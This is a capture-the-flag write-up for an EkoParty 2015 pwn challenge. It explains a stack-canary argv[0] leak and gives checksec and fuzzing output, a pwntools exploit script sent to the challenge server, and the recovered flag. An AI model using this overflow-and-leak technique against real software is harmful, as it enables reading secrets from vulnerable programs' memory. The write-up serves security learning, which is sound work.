{"pageContext":{"html":"<p><a href=\"ctf=ekoparty-pre-ctf-2015\"></a>\n<a href=\"type=pwn\"></a>\n<a href=\"tags=buffer-overflow\"></a></p>\n<p>Again we are given a <a href=\"../pwn100.zip\">zip</a>\nExtracting it gives us <a href=\"../xpl\">xpl</a> executable.</p>\n<pre><code class=\"language-bash\">$ file xpl \nxpl: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=1856a84cc2663caa91e1511a2f0691652201fb95, not stripped\n\n./xpl\nInteresting data loaded at 0x7fff3a9971a0\nYour username? aa\n</code></pre>\n<p>Doing a checksec shows us</p>\n<pre><code class=\"language-bash\">gdb-peda$ checksec\nCANARY    : ENABLED\nFORTIFY   : disabled\nNX        : ENABLED\nPIE       : disabled\nRELRO     : Partial\n</code></pre>\n<p>Strange! NX enabled, we can't execute a shell code. Lets debug the binary.\nWe create a fake flag.txt and run it. </p>\n<p>Interesting data loaded at 0x7fff3a9971a0\nWhen we inspect the address we see that it contains the contents of flag.txt i.e our fake flag.</p>\n<p>Also when we give a long string as username, it crashes.</p>\n<pre><code class=\"language-bash\">$ ./xpl\nInteresting data loaded at 0x7fffab63c4c0\nYour username? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n*** stack smashing detected ***: ./xpl terminated\nAborted\n</code></pre>\n<p><a href=\"http://seclists.org/bugtraq/2010/Apr/243\">This</a> bugtraq post discusses a method to turn fortify into an attacker aid and use it to leak strings into the error output it prints. If we can manage to overwrite the argv[0] pointer we can leak any string for which we know the address.</p>\n<p>Perfect! we know the address of our flag and now our payload should be somewhat of the form 'A'*n+address(flag) and it would spew out our flag.\nQuick fuzzing with <a href=\"../fuzz.py\">fuzz.py</a></p>\n<pre><code class=\"language-bash\">$ python fuzz.py > fuzz.txt\n$ cat fuzz.txt | grep `cat flag.txt`\n376 Your username? *** stack smashing detected ***: AAAA\n</code></pre>\n<p>n=376\nNow for the final exploit, little changes in <a href=\"../fuzz.py\">fuzz.py</a></p>\n<pre><code class=\"language-python\">from pwn import *\nfrom time import sleep\nfor i in range(376,377):\n    #sh=process('./xpl')\n    sh=remote('challs.ctf.site',20001)\n    a=sh.recvline()\n    sh.send('A'*i+p64(int(a.split()[4],16)))\n    print i,a\n    try:\n        print sh.recvline()\n    except:\n        print i\n    sleep(0.1)\n</code></pre>\n<p>gives</p>\n<blockquote>\n<p>376  Interesting data loaded at 0x7fffffffe540\nYour username? <strong>* stack smashing detected *</strong>: EKO{pwning<em>stack</em>protector}</p>\n</blockquote>\n<p>Flag</p>\n<blockquote>\n<p>EKO{pwning<em>stack</em>protector}</p>\n</blockquote>"}}